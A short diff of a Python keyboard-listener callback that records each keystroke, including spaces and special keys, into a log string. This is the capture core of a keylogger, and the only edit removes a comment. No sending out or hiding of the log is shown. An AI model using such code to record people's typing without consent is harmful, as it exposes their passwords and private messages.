@@ -8,7 +8,7 @@ def on_press(key):
         log += key.char  
     except AttributeError:
         if key == keyboard.Key.space:
-            log += " "  # Spaces between words
+            log += " "  
         else:
             log += f" [{key.name}] "  # Special keys (e.g., Enter, Shift)
 
